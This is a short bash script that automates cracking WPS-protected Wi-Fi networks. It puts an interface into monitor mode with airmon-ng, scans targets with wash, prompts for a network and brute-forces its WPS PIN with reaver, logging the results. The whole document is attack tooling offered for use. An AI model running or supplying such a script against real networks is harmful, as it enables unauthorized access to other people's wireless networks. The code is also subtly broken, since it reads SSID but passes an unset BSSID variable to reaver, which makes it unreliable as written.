#!/bin/bash
# crack WPS Wireless Networks
# (w) Neo 2013
# History:
# 16.Feb 2013 Neo created
#
iface=$1

echo "[*] Crack WPS Wireless Networks"
echo "[*] Author: Neo (@neo_hac0x)"
echo "                            "
case $iface in
    wlan*)
  touch wps_pwn.log
	airmon-ng start $iface
	xterm -e "wash -s -i mon0" 
	echo "Which Net do you want to crack ?"
	read SSID
	reaver -i mon0 -b $BSSID -vv -d 0 >> wps_pwn.log
	airmon-ng stop $iface
	;;
    *)
	echo "Usage: $0 interface"
	;;
esac
